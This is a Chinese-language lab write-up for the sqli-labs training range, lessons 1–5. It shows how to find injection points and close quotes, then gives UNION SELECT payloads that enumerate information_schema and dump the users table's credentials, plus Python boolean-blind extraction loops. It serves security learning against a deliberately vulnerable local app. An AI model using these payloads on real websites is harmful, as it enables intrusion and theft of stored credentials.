---
title: "sqli-labs writeup"
date: 2026-05-05
tags: ["SQL注入", "sqli-labs", "Writeup"]
categories: ["靶场通关"]
---


## 环境启动


https://www.cnblogs.com/LY613313/p/16180127.html

- 先打开phpstudy,启动Apache和MySQL服务
- 然后打开浏览器输入127.0.0.1/sqli-labs/
  注，如果phpstudy安装在本机，就127.0.0.1或者localhost都可以，如果是虚拟机，则输入虚拟机的IP地址，/sqli-labs/是源码的文件夹的命名


## Less-1 (联合查询注入 - 单引号字符型)

#### 第一步：注入点发现

**(通用)测试流程**:试探程序如何处理意外的输入
> `?id=1      → 正常显示`  
> 确认id参数有效,获得“基准”（页面的正常状态）  
> `?id=1'     → 报错(SQL语法错误)`  
> 这说明：参数没有被过滤，参数被直接拼到 SQL 里  
> `?id=1'--+  → 正常显示`  
> `?id=1' and 1=1 --+ → 正常(1=1 永远为真 → 正常返回数据)`  
> `?id=1' and 1=2 --+ → 无显示(1=2 永远为假 → 返回空结果集 → 页面“无显示”)`  
> 这说明：参数在 SQL 的 where 条件中生效，且可以注入（ 参数值被放到了 SQL 的 WHERE 条件中）。  

**结论**：参数存在注入，闭合字符为单引号，可用 `--+` 注释。

---

#### 第二步：获取列数

```
?id=1' order by 3 --+  → 正常
?id=1' order by 4 --+  → 报错
```
**这说明：查询结果中一共有 3 列**

---

#### 第三步：找显示位

```
?id=111' union select 1,2,3 --+
```
页面输出：
```
Your Login name:2 → 说明第2列的数据显示在 Login name 位置
Your Password:3 → 说明第3列的数据显示在 Password 位置
```
**这说明：可以把恶意查询的结果放在第 2 列或第 3 列，它就会显示在页面上。**

---

#### 第四步：数据获取

已知：
> 第2列 → Login name 位置  
> 第3列 → Password 位置  
> 可以随意构造 union select ... 查询  

1. **查询数据库名**
```sql
?id=111' union select 1,2,database() --+
```
- 当前数据库名(security)

2. **查询所有表名**
```sql
?id=111' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+
```
- 表名：`emails,referers,uagents,users` 

3. **查询 users 表中的列名**
```sql
?id=111' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' --+
```
- 列名：`id,username,password`

4. **查询最终数据**
```sql
?id=111' union select 1,group_concat(username),group_concat(password) from security.users --+
```
- 从 security.users 表中取出所有用户名和密码

  ​


## Less-2 (联合查询注入 - 数字型)

#### 第一步：注入点发现


> ?id=1      → 正常显示  
> ?id=1'     → 报错，报错信息中没有显示多出的引号，而是直接在LIMIT 0,1处报错  
> ?id=1'--+  → 仍然报错  
> 这说明：**不是字符型，是数字型**  
> ?id=1 and 1=1  → 正常  
> ?id=1 and 1=2  → 无显示  

> 最快速的验证：直接试 ?id=1 and 1=2 → 无显示，再试 ?id=1 and 1=1  → 正常。如果成立，就说明是数字型，无需考虑引号。  

**结论**：参数存在注入，**数字型**，无需引号闭合，直接构造 SQL 语句即可。

#### 后续流程类似Less-1




## Less-3 (联合查询注入 - 单引号+括号字符型)

#### 第一步：注入点发现

> ?id=1      → 正常显示  
> ?id=1'     → 报错，提示near ''1'') LIMIT 0,1'  
> ?id=1') --+  → 正常  
> ?id=1') and 1=1 --+  → 正常  
> ?id=1') and 1=2 --+  → 无显示  

**结论**：闭合字符为 `')`，注释符 `--+`。

#### 后续流程类似Less-1



## Less-4 (联合查询注入 - 双引号+括号字符型)

#### 第一步：注入点发现

> ?id=1 → 正常显示 Dumb/Dumb  
> ?id=1' → **正常**（双引号包裹时，单引号不会破坏语法，MySQL 会将 '1' 转为数字 1）  
> ?id=1" → **报错**（因为多出的双引号导致括号内字符串提前闭合，语法错误）  
> ?id=1") --+ → 恢复正常显示  
> ?id=1") and 1=1 --+ → 正常  
> ?id=1") and 1=2 --+ → 无显示  

**结论**：闭合字符为 ")，注释符 --+。

#### 后续流程类似Less-1




## Less-5 (布尔盲注 - 单引号字符型)

### 第一步：注入点判断
> ?id=1 → 显示 "You are in..."  
> ?id=1' → 报错  
> ?id=1' --+ → 显示 "You are in..."  
> ?id=1' and 1=1 --+ → 显示 "You are in..."  
> ?id=1' and 1=2 --+ → 无显示  

**结论**：单引号闭合，页面只有“有内容”和“无内容”两种状态，没有数据回显,使用布尔盲注。

### 辅助函数定义
- `test(condition)`：构造 `1' and [condition] #` 并发送请求，若页面包含 "You are in" 则返回 `True`，否则 `False`。
- `get_data(sql_expr)`：利用 `test()` 自动获取任意 SQL 表达式的值（先探测长度，再逐字符猜解），返回字符串。

### 第二步：获取数据库名
先获取长度，再逐字符猜解

```python
# 长度探测：数据库名长度为 8
for i in range(1, 31):
    if test(f"length(database()) = {i}"):
        db_len = i
        break

# 逐字符获取数据库名，遍历可打印 ASCII 码 32~126
db_name = ""
for pos in range(1, db_len+1):
    for code in range(32, 127):
        # 判断当前字符的 ASCII 码是否等于 code
        if test(f"ascii(substr(database(),{pos},1)) = {code}"):
            db_name += chr(code)
            break
print(f"Database: {db_name}")   # 输出 security
```

### 第三步：获取所有表名
利用` information_schema.tables` 和 `limit`。
```python
# 统计表数量
count = int(get_data("select count(*) from information_schema.tables where table_schema=database()"))
print(f"[+] Found {count} tables")

tables = []
for i in range(count):
    # 使用 limit i,1 依次获取第 i 个表名
    tbl = get_data(f"select table_name from information_schema.tables where table_schema=database() limit {i},1")
    tables.append(tbl)
    print(f"  Table {i+1}: {tbl}")   # emails, referers, uagents, users
```

### 第四步：获取 users 表的列名
```python
# 统计列数
col_count = int(get_data("select count(*) from information_schema.columns where table_schema=database() and table_name='users'"))
print(f"[+] 'users' table has {col_count} columns")

columns = []
for i in range(col_count):
    col = get_data(f"select column_name from information_schema.columns where table_schema=database() and table_name='users' limit {i},1")
    columns.append(col)
    print(f"  Column {i+1}: {col}")   # id, username, password
```

### 第五步：获取数据
```python
# 统计行数
row_count = int(get_data("select count(*) from users"))
print(f"[+] 'users' table has {row_count} rows")

# 逐行提取用户名和密码
for r in range(row_count):
    username = get_data(f"select username from users limit {r},1")
    password = get_data(f"select password from users limit {r},1")
    print(f"  {username} : {password}")
```